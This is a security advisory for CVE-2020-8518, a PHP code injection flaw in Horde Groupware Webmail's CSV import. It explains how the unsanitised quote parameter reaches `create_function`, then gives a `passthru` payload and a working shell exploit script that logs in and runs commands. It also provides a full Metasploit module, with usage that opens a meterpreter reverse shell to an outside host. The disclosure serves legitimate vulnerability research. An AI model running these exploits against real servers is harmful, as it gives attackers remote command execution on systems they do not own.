---
title: '[CVE-2020-8518] Horde Groupware Webmail Edition 5.2.22 — RCE in CSV data import'
description: A vulnerability in the handling of CSV data import allows authenticated users to inject arbitrary PHP code thus achieving RCE on the server hosting the web application.
tags: [CVE, Horde, RCE, CSV]
advisory:
  discovered: 2019-06-19
  product: '[Horde Groupware Webmail Edition](https://www.horde.org/apps/webmail)'
  versions:
    - 2.1.4 ([Horde Data API](https://github.com/horde/Data))
  cve: CVE-2020-8518
---

## Abstract

The Horde project comprises several standalone applications and libraries, the [Horde Groupware Webmail Edition suite](https://www.horde.org/apps/webmail) (tested version 5.2.22) bundles several of them by default, among those, Data is a library used to manage data import/export in several formats, e.g., CSV, iCalendar, vCard, etc.

The function in charge of parsing the CSV format uses `create_function` in a way that is possible to inject arbitrary PHP code thus achieving RCE on the server hosting the web application.

This feature is used by several Horde applications: Turba (address book; via `/turba/data.php`), Mnemo (notes; via `/mnemo/data.php`), Nag (tasks; via `/nag/data.php`) and Kronolith (calendar)[^kronolith]. By using one of these an authenticated user can execute PHP and shell code as the user that runs the web server, usually `www-data`.

In the master branch of the [Data][horde-data] repository a [commit][horde-data-fix] replaced `create_function` with a lambda function (as suggested by PHP that deprecated `create_function` in version 7.2.0) yet apparently the authors failed to recognize the exploitable status of the prior code so they did not bump a new version, thus installing Horde via PEAR or Debian APT yields the vulnerable version (2.1.4).

Since this vulnerability does not concern IMP (the Horde webmail application) it is likely that also regular Horde Groupware (non-webmail edition) installations are affected.

[^kronolith]: Although it seems feasible according to the source code it does not seem possible to reach the feature via the web interface.

[horde-data]: https://github.com/horde/Data

[horde-data-fix]: https://github.com/horde/Data/commit/78ad0c2390176cdde7260a271bc6ddd86f4c9c0e#diff-e6c7843f9847ab630ddabc9b004e1e7d

## Details

In the file `lib/Horde/Data/Csv.php` the following snippet is used to parse a CSV line:

```php
if ($row) {
    $row = (strlen($params['quote']) && strlen($params['escape']))
        ? array_map(create_function('$a', 'return str_replace(\'' . str_replace('\'', '\\\'', $params['escape'] . $params['quote']) . '\', \'' . str_replace('\'', '\\\'', $params['quote']) . '\', $a);'), $row)
        : array_map('trim', $row);
```

Among the other things, the user supplies `$params['quote']`, so for example if its value is `quote` then `create_function` is called as:

```php
create_function('$a', "return str_replace('\\quote', 'quote', \$a);");
```

The insufficient sanitization of `$params['quote']` escapes `'` as `\'` but fails to escape the `\` itself thus allowing to escape the last hard coded `'`. By passing `quote\`, `create_function` is called as:

```php
create_function('$a', "return str_replace('\\quote\\', 'quote\\', \$a);")
```

And evaluated body is:

```php
return str_replace('\quote\', 'quote\', $a);
```

Which causes a syntax error. (Note how the first string argument of `str_replace` now terminates at the first `'` of the second instance of `quote`.)

Follows a simple payload that executes the `id` shell command and returns the output in the response:

```
).passthru("id").die();}//\
```

Where the evaluated body eventually is:

```php
return str_replace('\).passthru(id).die();}//\', ').passthru(id).die();}//\', $a);
```

Here is the explanation of its parts:

- `)` terminates `str_replace`;

- the concatenation operator (`.`) continues the expression since the code starts with a `return`;

- `passthru("id")` is an example of the actual payload to be executed;

- `die()` is needed because `create_function` is used inside `array_map` thus it can be called multiple times and it also aborts the rest of the page;

- `}` terminates the block `function (...) {...}` used by the implementation of `create_function`, otherwise the following `//` would comment out `}` causing a syntax error;

- `//` comments out the remaining invalid PHP code;

- `\` escapes the hard coded string as shown above.

Since some characters are treated specially, it may be convenient to encode the command to be executed with Base64, the payload will then become:

```
).passthru(base64_decode("aWQ=")).die();}//\
```

## Proof of concept

Among all the affected applications, Mnemo is probably one of the easiest to exploit as it does not require additional parameters that need to be scraped from the pages.

### Manual exploit

This vulnerability can be easily exploited manually by any registered user:

1. log into Horde;

2. navigate to `http://target.com/mnemo/data.php`;

3. select any non-empty file to import then click "Next";

4. in the input field labeled by "What is the quote character?" write the payload, e.g., `).passthru("id").die();}//\`
then click "Next";

5. the output of the command should be returned, for example:

   ```
   uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```

### Shell exploit

Follows a simple script that automates the above steps:

```sh
#!/bin/sh

if [ "$#" -ne 4 ]; then
    echo '[!] Usage: <url> <username> <password> <command>' 1>&2
    exit 1
fi

BASE="$1"
USERNAME="$2"
PASSWORD="$3"
COMMAND="$4"

JAR="$(mktemp)"
trap 'rm -f "$JAR"' EXIT

echo "[+] Logging in as $USERNAME:$PASSWORD" 1>&2
curl -si -c "$JAR" "$BASE/login.php" \
    -d 'login_post=1' \
    -d "horde_user=$USERNAME" \
    -d "horde_pass=$PASSWORD" | grep -q 'Location: /services/portal/' || \
    echo '[!] Cannot log in' 1>&2

echo "[+] Uploading dummy file" 1>&2
echo x | curl -si -b "$JAR" "$BASE/mnemo/data.php" \
    -F 'actionID=11' \
    -F 'import_step=1' \
    -F 'import_format=csv' \
    -F 'notepad_target=x' \
    -F 'import_file=@-;filename=x' \
    -so /dev/null

echo "[+] Running command" 1>&2
BASE64_COMMAND="$(echo -n "$COMMAND 2>&1" | base64 -w0)"
curl -b "$JAR" "$BASE/mnemo/data.php" \
    -d 'actionID=3' \
    -d 'import_step=2' \
    -d 'import_format=csv' \
    -d 'header=1' \
    -d 'fields=1' \
    -d 'sep=x' \
    --data-urlencode "quote=).passthru(base64_decode(\"$BASE64_COMMAND\")).die();}//\\"
```
{: download="exploit.sh"}

### Metasploit module

A Metasploit module is provided for convenience:

```ruby
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(
      update_info(
        info,
        'Name'           => 'Horde CSV import arbitrary PHP code execution',
        'Description'    => %q{

          The Horde_Data module version 2.1.4 (and before) present in Horde
          Groupware version 5.2.22 allows authenticated users to inject
          arbitrary PHP code thus achieving RCE on the server hosting the web
          application.

        },
        'License'        => MSF_LICENSE,
        'Author'         => ['Andrea Cardaci <cyrus.and@gmail.com>'],
        'References'     => [
          ['CVE', '2020-8518'],
          ['URL', 'https://cardaci.xyz/advisories/2020/03/10/horde-groupware-webmail-edition-5.2.22-rce-in-csv-data-import/']
        ],
        'DisclosureDate' => '2020-02-07',
        'Platform'       => 'php',
        'Arch'           => ARCH_PHP,
        'Targets'        => [['Automatic', {}]],
        'Payload'        => {'BadChars' => "'"},
        'Privileged'     => false,
        'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to the web application', '/']),
        OptString.new('USERNAME',  [true, 'The username to authenticate with']),
        OptString.new('PASSWORD',  [true, 'The password to authenticate with'])
      ])
  end

  def login
    username = datastore['USERNAME']
    password = datastore['PASSWORD']
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri, 'login.php'),
      'cookie'    => 'Horde=x', # avoid multiple Set-Cookie
      'vars_post' => {
        'horde_user' => username,
        'horde_pass' => password,
        'login_post' => '1'})
    if not res or res.code != 302 or res.headers['Location'] != '/services/portal/'
      fail_with(Failure::UnexpectedReply, 'Login failed or application not found')
    else
      vprint_good("Logged in as #{username}:#{password}")
      return res.get_cookies
    end
  end

  def upload_csv(cookie)
    data = Rex::MIME::Message.new
    data.add_part('11',  nil, nil, 'form-data; name="actionID"')
    data.add_part('1',   nil, nil, 'form-data; name="import_step"')
    data.add_part('csv', nil, nil, 'form-data; name="import_format"')
    data.add_part('x',   nil, nil, 'form-data; name="notepad_target"')
    data.add_part('x',   nil, nil, 'form-data; name="import_file"; filename="x"')
    res = send_request_cgi(
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri, 'mnemo/data.php'),
      'cookie' => cookie,
      'ctype'  => "multipart/form-data; boundary=#{data.bound}",
      'data'   => data.to_s)
    if not res or res.code != 200
      fail_with(Failure::UnexpectedReply, 'Cannot upload the CSV file')
    else
      vprint_good('CSV file uploaded')
    end
  end

  def execute(cookie, function_call, check)
    options = {
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri, 'mnemo/data.php'),
      'cookie'    => cookie,
      'vars_post' => {
        'actionID'      => '3',
        'import_step'   => '2',
        'import_format' => 'csv',
        'header'        => '1',
        'fields'        => '1',
        'sep'           => 'x',
        'quote'         => ").#{function_call}.die();}//\\"}}
    if check
      # deliver the payload and return the body
      res = send_request_cgi(options)
      if not res or res.code != 200
        fail_with(Failure::UnexpectedReply, 'Cannot execute the payload')
      else
        vprint_good('Payload executed successfully')
        return res.body
      end
    else
      # deliver the payload in a a new thread since the meterpreter payload does
      # not terminate when successful this allows to poll for session creation
      t = framework.threads.spawn(nil, false) {
        send_request_cgi(options)
      }
      while t.alive? and not session_created?
        Rex::ThreadSafe.sleep(0.1)
      end
    end
  end

  def check
    begin
      cookie = login()
      upload_csv(cookie)
      body = execute(cookie, 'printf("check")', true)
      return Exploit::CheckCode::Appears if body == 'check'
    rescue Msf::Exploit::Failed
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    cookie = login()
    upload_csv(cookie)
    # do not terminate the statement
    function_call = payload.encoded.tr(';', '')
    vprint_status("Sending payload: #{function_call}")
    execute(cookie, function_call, false)
  end
end
```
{: download="horde_csv_rce.rb"}

Place it in `~/.msf4/modules/exploits/multi/http/horde_csv_rce.rb`, then use it like:

```console
use exploit/multi/http/horde_csv_rce
set payload php/meterpreter/reverse_tcp
set lhost 10.10.10.10
set rhost target.com
set username username
set password password
run
```

## Timeline

2019-06-20
: First contact with SecuriTeam Secure Disclosure (SSD).

2019-07-14
: Disclosure via the SSD program.

2019-07-31
: SSD grants the reward.

2020-02-04
: Horde development team [fixes](https://lists.horde.org/archives/announce/2020/001285.html) the issue in version 2.1.5.

2020-02-07
: SSD publishes the [advisory](https://ssd-disclosure.com/archives/4097/ssd-advisory-horde-groupware-webmail-edition-remote-code-execution).
